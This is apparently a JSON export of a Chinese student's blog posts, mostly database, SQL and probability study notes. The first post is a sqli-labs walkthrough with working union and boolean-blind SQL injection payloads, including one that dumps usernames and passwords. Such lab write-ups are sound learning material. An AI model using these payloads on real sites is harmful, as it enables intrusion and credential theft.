[{"content":" 工具：phpstudy，Hackbar 搭建靶场：sqli-labs(从Github上下载官方的，有些民间的可能会有木马) 数据库：mysql5.7 联合注入 需要页面有回显位\n查找注入点\n判断使字符型还是数字型注入id=2-1\n如果是字符型，找到闭合方式，‘，“，’)\n判断查询列数，order by\n查询回显位置，同时将原先的查询id注释掉\n拿到表名和列名：数据库（information_schema），表名集合表（tables），列名集合表（columns）用group_concat()确保所有查询信息能放到一行显示出来\nless-1 判断是否存在sql注入\n\u0026ndash;+表示对多余的引号进行注释，因为是字符型，数字型就不用管\n1 ?id=1\u0026#39; order by 3--+ 显示正常\n1 ?id=1\u0026#39; order by 4--+ 报错\n得知less-1共有三列，爆出显示位\n1 ?id=1\u0026#39; union select 1,2,3--+ 在mysql里面尝试union select\n1 ?id=-1\u0026#39; union select 1,2,3--+ 使id=-1报错注释，页面显示正常\n获取数据名\n1 ?id=-1\u0026#39; union select 1,database(),version() --+ 中间省略了一些过程详见less-2\n查询用户名和密码\n1 ?id=-1\u0026#39; union select 1,group_concat(username,\u0026#39;~\u0026#39;,password),3 from users--+ less-2 判断为数字型，页面改变\n1 ?id=2-1 ？id=2 三列\n1 ?id=1 order by 3 闭合方式为‘\n1 ?id=1\u0026#39; order by 3 爆数据名\n1 ？id=-1 union select 1,database(),version() 爆表名\n1 ?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39; 爆列名\n1 ?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;security\u0026#39; less-3 与前两关不同的地方是闭合方式\n1 ?id=1\u0026#39; 单引号加括号，后续一律以?id=1\u0026rsquo;)开头，和上面同\nless-4 判断得知闭合方式双引号加括号\n1 /?id=2\u0026#34; 布尔盲注 页面没有回显，只适用于Mysql，本质就是猜数字游戏，ASCII码判断用二分法，对于字符长度判断可以直接猜大小\n判断得知闭合方式为'\n二分法判断数据库长度 1 2 3 4 ?id=1\u0026#39; and length(database())\u0026gt;10--+ //不显示 ?id=1\u0026#39; and length(database())\u0026gt;5--+ //正常显示 ?id=1\u0026#39; and length(database())\u0026gt;7--+ //正常显示 ?id=1\u0026#39; and length(database())\u0026gt;8--+ //不显示 得知database（）长度为8\n二分法利用ASCII码判断字符 1 2 3 4 ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;100--+ //正常显示 ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;114--+ //正常显示 ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;120--+ //不显示 ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;115--+ //不显示 得知第一个字符ASCII码为115，即“s”\n依次判断8个字符，知当前数据库为security\n判断当前数据库的表 判断是否存在admin表\n1 ?id=1\u0026#39; and exists(select * from admin)--+ 判断表的个数 1 2 ?id=1\u0026#39; and (select count(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39;)\u0026gt;4--+ //正常显示 ?id=1\u0026#39; and (select count(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39;)\u0026gt;3--+ //不显示 逐一判断表名字符长度 1 ?id=1\u0026#39; and length((select table_name from information_schema.tables where table_schema=\u0026#39;security\u0026#39; limit 0,1))=6--+ 逐一判断表名字符的ASCII码 1 ?id=1\u0026#39; and ascii(substr((select table_name from information_schema.tables where table_schema=\u0026#39;security\u0026#39; limit 0,1),1,1))\u0026gt;100--+ 存在emails,referers,uagents,users\n对column执行相同的操作，where语句修改 1 where table_name = \u0026#39;users\u0026#39; //以及uagents,referers,emails.......一个一个判断，虽然这个过程真的十分漫长 得知users中有三个字段id,username,password\n判断字段长度 1 ?id=1\u0026#39; and length((select id from users limit 3,1))=1--+ 判断字段ASCII值 1 ?id=1\u0026#39; and ascii(substr((select id from users limit 3,1)),1,1)\u0026gt;100--+ ","date":"2025-01-05T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/sqli-labs%E9%80%9A%E5%85%B3/","title":"sqli-labs通关"},{"content":"记号\n$$\\binom n{n_1,n_2,\\cdots,n_r}=\\frac{n!}{n_1!n_2!\\cdots n_r!}$$因此，$\\binom n{n_1,n_2,\\ldots,n_r}$表示把 $n$ 个 不 同 的 元 素 分 成 大 小 分 别 为 $n_1, n_2, \\ldots , n_r$的$r$个\n不同组的组合数. 例 5e 假设有$n+m$个球，其中$n$个红的，$m$个蓝的，将它们随机排成一排，即所$(n+m)!$种排列都是等可能的. 如果只记录连续排列的球的颜色，证明各种可能的结果概率是一样的. 解 我们将$(n+m$)个球的次序排列称为一组球的排列，将 $n+m$ 个球的颜色次序排称为一组球的颜色次序排列. 球的排列共有($n+m$)!种，在红球之间作任何一个位于换，在蓝球之间作任何一个位置置换，置换的结果并不影响球的颜色次序排列. 从而组球的颜色次序排列，对应于$n!m!$个球的排列，这说明球的次序排列也是等可能的且每一种颜色次序出现的概率为$n!m!/(n+m)!.$\n多项式定理\n$$(x_{1}+x_{2}+\\cdots+x_{r})^{n}=\\sum_{\\begin{array}{c}(n_{1},\\cdots,n_{r}):\\\\n_{1}+\\cdots+n_{r}=n\\end{array}}\\binom{n}{n_{1},n_{2},\\cdots,n_{r}}x_{1}^{n_{1}}x_{2}^{n_{2}}\\cdots x_{r}^{n_{r}}$$上式的求和号是对满足 $n_1+n_2+\\cdotp\\cdotp\\cdotp\\cdotp+n_r=n$ 的所有非负整数向量($n_1,n_2,\\cdotp\\cdotp\\cdotp,n_r)$求和.\n命题 6.1 共有$\\binom{n-1}{r-1}$个不同的正整数向量$(x_1,x_2,\\cdots,x_r)$满足 为了得到非负整数解(而不是正整数解)的个数，注意，$x_1+x_2+\\cdots+x_r=n$的非负整数解个数与$y_1+y_2+\\cdotp\\cdotp\\cdotp+y_r=n+r$的正整数解个数是相同的(令$y_i= x_i+ 1$, $i= 1$, $\\cdots$, $r) .$ 因此，利用命题 6.1,可得到如下命题。\n生日问题 如果房间里有$n$个人，那么没有两人的生日是同一天的概率是多大？当$n$多大 时，才能保证此概率小于1/2? 解 每个人的生日都有 365 种可能，所以$n$个人一共是 365\u0026quot; 种可能(此处忽略有人生日是 2月 29 日的可能性). 假定每种结果的可能性都是一样的，那么所求事件的概率为$365\\times364\\times363\\times\\cdots\\times(365-n+1)/365^n.$令人惊奇的是，一旦$n\\geqslant23$,这个概率就比1/2要小. 即房间里人数如果超过 23 的话，那么至少有两人为同一天生日的概率就大于 1/2. 很多人一开始对这个结果很吃惊，因为 23 相对于一年 365 天来说太小了.然而，对每两个人来说，生日相同的概率为$\\frac{365\\cdot\\tilde{}}{(365)^2}=\\frac1{365}$,23个人一共可以组成$\\binom{23}2=253$ 对，这样来看上述结果似乎就不再令人吃惊了.\n配对问题 假设有 N 位男士参加舞会，所有人都将帽子扔到房间中央混在一 起，然后每人再随机拿一顶帽子.所有人都没有拿到自己帽子的概率是多少？ 解 先计算至少有一人拿到自己的帽子的概率.令$E_i(i=1,2,\u0026hellip;,N)$表示事件“第$i$ 人拿到了自己的帽子”.这样，由命题 4.4,至少有一人拿到了自己的帽子的概率为：\n$$P\\Big(\\bigcup_{i=1}^{N}E_{i}\\Big)\\:=\\sum_{i=1}^{N}P(E_{i})-\\sum_{i_{1}","date":"2024-12-27T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%A6%82%E7%8E%87%E8%AE%BA%E6%A8%A1%E5%9E%8B%E5%8F%8A%E5%B0%8F%E7%BB%93/","title":"概率论模型及小结"},{"content":"第二章 关系数据库 1.试述关系模型的三个组成部分\n关系数据结构：只包含单一的数据结构——关系，由三种类型：基本关系（基本表），查询表和视图表\n关系操作集合：查询（选择，投影，并，差，笛卡尔积），插入，删除，修改\n关系完整性约束\n2.关系数据语言的特点和分类\n(1)关系代数语言 (2)关系演算语言：元组关系演算语言和域关系演算语言 (3)SQL：具有关系代数和关系演算双重特点的语言\n3.解释术语，说明关系与联系\n（1）域：一组具有相同数据类型的值的集合\n（2）笛卡尔积：给定一组域D1,D2,\u0026hellip;,Dn,D1×D2×\u0026hellip;×Dn={(d1,d2,\u0026hellip;,dn),di∈Di}\n（3）关系：D1×D2×\u0026hellip;×Dn（笛卡尔积）的有限子集，表示为R（D1,D2,D3,\u0026hellip;,Dn），n=1，一元关系，n=2，二元关系，也是一张二维表\n（4）元组：笛卡尔积中每一个元素{(d1,d2,\u0026hellip;,dn),di∈Di}，一个n元组\n（5）属性：在二维表中，是一列，n目关系有n个属性（列）\n（1）主码：从多个候选码中选定一个作为主码\n（2）候选码：某一属性组的值额能唯一的标识一个元组，而其子集不能\n（3）外码：关系R中的一个属性F并不是R的码，但对应另一个关系S中的主码Ks，F称为R和S的外码，定义在同一个域上\n（1）关系模式（型）：关系的描述，R（U,D,DOM,F)，R为关系名，U为属性名集合，D为属性来自的域，DOM为属性向域的映像集合（如属性的类型，长度\n（2）关系（值）：包括基本关系（基本表），查询表，视图表\n（3）关系数据库：所有关系的集合\n4.举例说明关系模式和关系的联系\n关系是关系模型在某一时刻的状态或内容，关系模式是静态的，稳定的，关系是动态的，随时间不断变化的。\n5.试述关系模型的完整性规则。在参照完整性中，说明情况下外码属性的值可以为空值\n实体完整性：主属性不能去空值（null）\n参照完整性：两个关系之间存在着属性的引用，如学生的学号取值需要参照专业关系中的专业号\n用户定义的完整性：应用领域需要遵循的约束条件，语义约束\n在参照完整性规则中，外码属性的值可以取空值只有当外码的每个属性值取空值（二维表中每一列都是NULL）\n6.试述等值连接与自然连接的区别和联系\n自然连接是一种特殊的等值连接，，自然连接取消重复列\n7.关系代数的基本运算\n传统的集合运算：二目运算，包括并，差，交，笛卡尔积\n专门的关系运算：选择，投影，连接（查询就是一个关系在属性上的投影，取消某些列和重复元组），除运算\n","date":"2024-12-09T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E4%B9%A0%E9%A2%98%E7%AD%94%E6%A1%88/","title":"数据库系统概论第二章习题答案"},{"content":"第一章 绪论 1.试述数据，数据库，数据库管理系统，数据库系统的概念\n数据：描述事物的符号 数据库DB：长期储存在计算机内，有组织的，可共享的大量数据的集合。数据库中的数据按一定的数据模型组织，描述和储存，具有较小的冗余度，较高的数据独立性和易扩展性，并可为各种用户共享 数据库管理系统DBMS：系统软件，有以下功能： 数据定义 数据组织，存储和管理 数据操纵功能 数据库的事务管理和运行管理 数据库建立和维护 数据库系统DBS：由DB，DBMS,DA组成的存储，管理，处理和维护数据的系统 2.使用数据库有什么好处？\n数据结构化：整体和内部\n数据的共享性高，冗余度低且易扩展：大大减少数据冗余，节约存储空间，避免数据之间的不相容性与不一致性\n数据独立性高：\n物理独立性，用户的应用程序与数据库中数据库数据的物理存储相互独立 逻辑独立性：用户的应用程序与数据库的逻辑结构是相互独立 数据由数据库管理系统统一管理和控制\n数据的安全性保护：保护数据以防止不合法使用造成的数据泄密和破坏 数据的完整性检查：数据的正确性，有效性和相容性 用户可以并发控制 数据库恢复功能：比如说rollback 3.试述文件系统与数据库系统的区别和联系\n见P7表1.1\n6.数据库管理系统的主要功能\n在数据库建立，运用和维护时对数据库进行统一控制，以保证数据的完整性和安全性，并在多用户同时使用数据库时进行并发控制，在发生故障后对数据库进行恢复\n7.什么是概念模型？试述概念模型的作用\n信息模型，按用户的观点对数据和信息建模，主要用于数据库设计，用于信息世界的建模\n8.定义并解释概念模型中以下术语：\n实体：客观存在并可相互区别的事物。如具体的人，事，物，抽象的概念或联系\n实体型：用实体名及其属性名集合来抽象和刻画同类实体，如学生（学生号，姓名，性别，所在院系\u0026hellip;)\n实体集：同一类型实体的集合。例如，全体学生就是一个实体集\n实体之间的联系：或称不同实体集之间的联系\n9.试述数据模型的概念，数据模型的作用和数据模型的三个要素\n对现实世界数据特征的抽象，用来描述数据，组织数据和对数据进行操作\n比较真实地模拟现实世界 容易为人所理解 便于在计算机上实现 10.试述层次模型的概念，举出三个实例\n有且只有一个结点没有双亲结点（根节点），根以外的其他结点有且只有双亲结点，实例：行政结构，家族关系，生物分类学，电脑文件系统\n11.试述网状模型的概念，举出三个实例\n允许一个以上的结点无双亲，一个结点可以有多于一个的双亲，如互联网，社交网络，地铁交通网络\n12.试述层次，网状模型的优缺点\n层次模型的优点：\n数据结构简单清晰 数据库的查询效率高 层次数据模型提供了良好的完整性支持 层次模型的缺点：\n现实世界中很多联系是非层次性的 如果一个结点具有多个双亲结点等，不便于用层次模型表示联系 查询子女结点必须通过双亲结点 由于结构严密，层次命令趋于程序化 网状模型的优点：\n能够更为直接地描述现实世界，如一个结点可以有多个双亲，结点之间可以有多种联系 具有良好地性能，存取效率较高 网状模型的缺点：\n结构过程比较复杂 网状模型的DDL,DML复杂，需要嵌入语言 记录之间的联系通过存取路径实现，应用程序在访问数据时候必须选择适当的存取路径，用户必须了解系统结构的细节，加重了应用程序的负担 13.试述关系模型的概念，定义并解释以下术语\n关系模型由一组关系组成，每个关系的数据结构都是一张规范化的二维表。\n元组：表中的一行即为一个元组\n属性：表中的一列即为一个属性\n关系：一个关系对应以一张表\n码：某个可以唯一确定一个元组的属性组，如学生的学号\n域：一组具有相同数据类型的值的集合，如性别的域是{男，女}，大学生奈年龄属性的域是（15，45）\n分量：元组中的一个属性值\n14.试述关系数据库的特点\n规范化，即关系的每一个分量必须是一个不可分的数据项\n关系模型与格式化模型不同，建立在严格的数学概念的基础上\n概念单一，实体间的联系，对数据的检索和更新也是关系（Table），数据结构简单清晰\n存取路径透明，更高的数据独立性，更好的安全保密性，简化程序员的工作，但查询效率较低\n** 在计算机中，从某个角度*看不到的特性称该特性是透明的*。这个意义上的“透明”与社会生活中的透明含义*恰好相反*，例如计算机组织对程序员是透明的，就是说计算机组织对程序员来说是看不到的，也不需要看到的。*和汉语字典里面的意思不一样。 ***\n15，试述数据库系统的三级模式结构，并说明优点\n外模式，模式，内模式\n外模式：子模式或用户模式，数据库用户能够看见和使用的局部数据的逻辑结构和特征的描述，是数据库用户的数据视图，是与某一应用有关的数据的逻辑表示\n内模式：存储模式，数据物理结构和存储方式的描述，是数据在数据库内部的组织方式\n模式：逻辑模式，是数据库中全体数据的逻辑结构和特征的描述，是所有用户的公共数据视图，一个数据库只有一个模式\n使用户能够逻辑的，抽象的处理数据，而不必关心数据在计算机中的具体表示方式与存储方式\n17.什么叫数据与程序的物理独立性？数据与程序的逻辑独立性？为什么数据库由数据与程序的独立性？\n物理独立性：当数据库的存储结构改变时，由数据库管理员对模式/内模式映像作响应改变\n逻辑独立性：当模式改变时，由数据库管理员对各个外模式/模式的影响作相应改变，可以使外模式保持不变。应用程序是依据数据的外模式编写，从而应用程序不必修改，保证了数据与程序的逻辑独立性，简称数据的逻辑独立性。\n数据与程序之间的独立性使得数据的定义和描述可以从应用程序中分离出去。由于数据的存储由数据库管理系统管理，从而简化了应用程序的编制，大大减少了应用程序的维护和修改。\n18.试述数据库系统的组成\n数据库，数据库管理系统，应用程序和数据库管理员\n","date":"2024-12-09T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%B9%A0%E9%A2%98%E7%AD%94%E6%A1%88/","title":"数据库系统概论第一章习题答案"},{"content":"“中国的孩子自一出生就在冲刺，从双语幼儿园到重点高中，再经历千军万马过独木桥的高考。\n在人类前半生的这场性爱过程中，他们做足了前戏，也做了太久前戏，\n而这一切都在上大学时完成了痛快的射精，仿佛所有分泌的前列腺液都是值得的”\n","date":"2024-12-05T00:00:00Z","image":"https://Frederick2313072.github.io/p/20%E5%B2%81%E4%BA%86%E4%BD%86%E6%9C%89%E4%BA%9B%E8%AF%B4%E4%BA%86%E4%B8%8D%E5%A6%82%E4%B8%8D%E8%AF%B4/547a6a87146ee7bd92f1c1efdf2458045e2f600d_hu5596276418357378468.jpg","permalink":"https://Frederick2313072.github.io/p/20%E5%B2%81%E4%BA%86%E4%BD%86%E6%9C%89%E4%BA%9B%E8%AF%B4%E4%BA%86%E4%B8%8D%E5%A6%82%E4%B8%8D%E8%AF%B4/","title":"20岁了但有些说了不如不说"},{"content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 SELECT RTRIM(vend_name) + \u0026#39;(\u0026#39;+ --右边取消空格 RTRIM(vend_country) + \u0026#39;)\u0026#39; AS vend_title From Vendors ORDER BY vend_name; SELECT prod_id,quantity,item_price,quantity*item_price AS expanded_price FROM OrderItems; SELECT vend_name,UPPER(vend_name) --大写 AS vend_name_upcase FROM Vendors ORDER BY vend_name; SELECT cust_name,cust_contact FROM Customers WHERE SOUNDEX(cust_contact) = SOUNDEX(\u0026#39;Michael Green\u0026#39;); --近似发音 SELECT order_num FROM Orders WHERE DATEPART(yy,order_date) = 2020; SELECT AVG(prod_price) AS avg_price --取平均值 FROM Products WHERE vend_id = \u0026#39;DLL01\u0026#39;; SELECT COUNT(*)AS num_cust --对所有行计数 FROM Customers; SELECT MAX(prod_price) AS max_price FROM Products; SELECT SUM(quantity*item_price) AS items_ordered FROM OrderItems WHERE order_num = 20005; SELECT AVG(DISTINCT prod_price) AS avg_price FROM Products Where vend_id =\u0026#39;DLL01\u0026#39;; SELECT COUNT(*) AS num_items,MIN(prod_price) AS price_min,MAX(prod_price) AS proce_max,AVG(prod_price) AS price_avg --组合聚集函数 FROM products; SELECT vend_id,COUNT(*) AS num_prods FROM Products Group BY vend_id HAVING COUNT(*) \u0026gt;= 2;--过滤分组，group by 和 having结合 SELECT order_num,COUNT(*)AS items FROM OrderItems Group BY order_num HAVING COUNT(*) \u0026gt;= 3--检索包含三个或更多物品的订单号和订购物品的数目 ORDER BY items,order_num;--按订购物品的数目排序输出，having在group by前，order by后 SELECT cust_id FROM OrderItems WHERE prod_id = \u0026#39;RGAN01\u0026#39;; SELECT cust_id FROM Orders WHERE order_num IN (20007,20008); SELECT cust_id FROM Orders WHERE order_num IN (SELECT cust_id FROM Orders WHERE order_num IN (20007,20008));--建立以上的子查询，由内向外 SELECT cust_name,cust_state,(SELECT COUNT(*)FROM Orders WHERE Orders.cust_id=Customers.cust_id) AS orders --子查询对检索出的每个顾客执行一次，用句点避免混淆列名 FROM Customers ORDER BY cust_name;--对于检索出的每个顾客，统计其在Orders表中的订单数目 SELECT vend_name,prod_name,prod_price FROM Vendors,Products WHERE Vendors.vend_id = Products.vend_id; BEGIN TRANSACTION DELETE OrderItems WHERE order_num =12345 SAVE TRANSACTION delete1;--使用保留点delete1，保留点越多越好，额能进行灵活的回退 DELETE Orders WHERE order_num =12345 ROLLBACK TRANSACTION delete1;--回退到保留点delete1 COMMIT TRANSACTION--控制事物处理，最后的commit仅在中间过程不出错的情况下写出更改 BEGIN TRANSACTION DELETE OrderItems WHERE order_num =12345 SAVE TRANSACTION delete1;--使用保留点delete1，保留点越多越好，额能进行灵活的回退 DELETE Orders WHERE order_num =12345 ROLLBACK TRANSACTION delete1;--回退到保留点delete1 COMMIT TRANSACTION--控制事物处理，最后的commit仅在中间过程不出错的情况下写出更改 DECLARE CURSOR CustCursor IS SELECT * FROM Customers WHERE cust_email IS NULL; ALTER TABLE Vendors ADD CONSTRAINT PRIMARY KEY(vend_id)--设置主键，DBMS默认主键基本不修改或更新，不能重用 ALTER TABLE Orders ADD CONSTRAINT FOREIGN KEY (cust_id) REFERENCES Customers(cust_id);--将此表中的cust_id设置为Customers的主键，即外键。外键有助防止意外删除，若删除，级联删除 CREATE INDEX prod_name_ind--索引名 ON Products(prod_name)--被索引的表，列 CREATE TRIGGER customer_state ON Customers FOR INSERT,UPDATE AS UPDATE Customers SET cust_state=Upper(cust_state) WHERE Customers.cust_id = inserted.cust_id;--创建一个触发器，对所有INSERT和UPDATE操作，将cust_state转为大写 ","date":"2024-12-05T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/sql%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A%E4%BE%8B%E5%AD%90/","title":"SQL必知必会例子"},{"content":"Python 爬虫 建模 数据挖掘（统计方向的待定） JS 做个代办事项列表（我所能想到JS对我的唯一用处就是网页加个响应什么的）\n重新巩固C语言 Unity 学习C#语言，可能大创写个游戏，或者跟之前联系好的设计系朋友写着玩玩\nLeetcode 刷题周赛 算法与数据结构 算是提前预习大三内容，以及体验下朋友所说的算法addiction\n","date":"2024-12-02T00:00:00Z","image":"https://Frederick2313072.github.io/p/plan-after-this-semester/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20241202170215_hu9892375508239660670.jpg","permalink":"https://Frederick2313072.github.io/p/plan-after-this-semester/","title":"Plan after this semester"},{"content":"Python 基础语法到面向对象编程，小项目只用过pygame写了一个窗口射击游戏，图灵系列那本python编程学的很流畅，很快能上手项目\nJavascript 到现在只学了点皮毛，只会做动态内容更新，也只是自己做html网页时乱加上去的\nLinux 一开始甚至打算买个电脑重装Linux，看到无数人因为Linux整个大学没敲几行代码被劝退了，最后只学了Bash，但是和windows的shell不兼容，用的乌班图版本，以下是我试过的所有办法：\n虚拟盘开机和Windows双系统 虚拟机如virtualbox和Vmware（据说可以申请阿里云学生服务器，但我用的前者） Windows自带wsl，最后自己搞了个图形化界面，甚至现在偶尔还在用 工具 Vim：很容易上手，但不常用就会很快忘了（谁没事会在shell里面编辑文本） Nano：可读性比Vim强，但我已经习惯Vim了 SSH Docker Git：最重要的一个，不用多说 数据库 学校课程，但反而很不上心，明天开始重学\nCS常识 b站有个做的很好的科普视频，会放在Resource里面\nHtml 严格来说，太简单算不上编程语言\nCSS 之前自己做了个CSS模板，结果在运行cmd时被tailwind覆盖完了，没有git到远程仓库\u0026hellip;\u0026hellip;\n数学分析3，概率论 前者太难听不懂，后者太简单不想听\n","date":"2024-12-02T00:00:00Z","image":"https://Frederick2313072.github.io/p/summary-in-november/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20241202225640_hu15903600476363975967.jpg","permalink":"https://Frederick2313072.github.io/p/summary-in-november/","title":"Summary in November"},{"content":"第三章 SQL 1.试述SQL的特点\n综合统一，高度非过程化，面向集合的操作方式，以同一种语法结构提供多种使用方式\n2.说明在DROP TABLE时，RESTRICT和CASCADE的区别\n","date":"0001-01-01T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/","title":""}]